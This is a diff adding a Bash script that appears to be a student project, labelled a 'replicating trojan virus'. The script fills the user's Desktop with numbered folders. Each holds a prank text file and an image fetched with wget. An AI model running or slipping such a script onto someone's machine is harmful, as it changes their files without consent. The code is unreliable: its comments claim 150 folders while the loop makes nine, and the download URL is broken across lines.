@@ -1,1 +1,47 @@
+#!/bin/bash
+#
+# Proyecto E. Virus troyano de replicacion
+#
+# Equipo - Los Discos Mas Duros
+# /////////////////////////////////////////////////////////////
+# Integrantes - Creado por: 
+# /////////////////////////////////////////////////////////////
+# Arce Medina Valeria
+# Azamar Avilés Santiago
+# Cardoso Martinez Luis Fernando
+# Carreón Alonso Sebastián
+# Castillo Corona Enrique
+# Izaguirre Camacho Jorge
+# /////////////////////////////////////////////////////////////
+# Aqui empieza el codigo del virus troyano de replicacion
+# Experimento 2
 
+
+#Aqui utilizamos el comando cd para generalizar e indicar todo el porgrama se realiace en el programa.
+cd ./Escritorio
+#Aqui inicializamos el contador que se utiliza en el ciclo while para replicar lar carpetas con archivos.
+Contador=1
+
+#Aqui esta el ciclo while en donde vamos aumentando el contador, cada vez que hace el ciclo se crea una carpeta nueva.
+#En esta parte tambien se pone el limite de carpetas con archivos que se deseen crear.
+#En nuestro caso ponemos 150 por lo tanto se crearan 150 carpetas de archivos en el escritorio del usuario.
+while [ $Contador -lt 10 ]
+
+do 
+mkdir "Джепетомамахуево $Contador" #En esta parte utilizamos la intruccion mkdir para crear cada carpeta con el mismo nombre pero con numero diferente en cada ciclo.
+#Utilizamos el nombre del archivo + el contador para que se puedan crear todas las carpetas en el escritorio sin que ocurra algun error por tener el mismo nombre.
+
+echo -n "Esto es un virus troyano, se te lleno el escritorio con muchos archivos GRACIAS :)" >> "Джепетомамахуево $Contador/archivo.txt"
+#Utilizamos la instruccion echo para escribir y crear un archivo .txt dentro de la carpeta creada anteriormente.
+
+wget -O "Джепетомамахуево $Contador/Larry.png" "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/da2258e7-8fdc-4bc8-84fa-dde10c081bdc/d5sid0m-b5bac072-30ba-4fc2-92c3-04c5c4bfb63a.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1
+t7InBhdGgiOiJcL2ZcL2RhMjI1OGU3LThmZGMtNGJjOC04NGZhLWRkZTEwYzA4MWJkY1wvZDVzaWQwbS1iNWJhYzA3Mi0zMGJhLTRmYzItOTJjMy0wNGM1YzRiZmI2M2EucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQ
+iXX0.Kyn5UdXDekOfTWvLvNLoQMFP5X5-6frU6aJmrypmNyg"
+#Aqui se utiliza el comando wget para descargar de internet una imagen .png y guardarla en la carpeta previamente creada.
+
+let Contador++
+#Se utiliza la intruccion let para aumentar el contador y seguir con el ciclo.
+
+done
+#Fin programa
+#////////////////////////////////////////////////////////////////
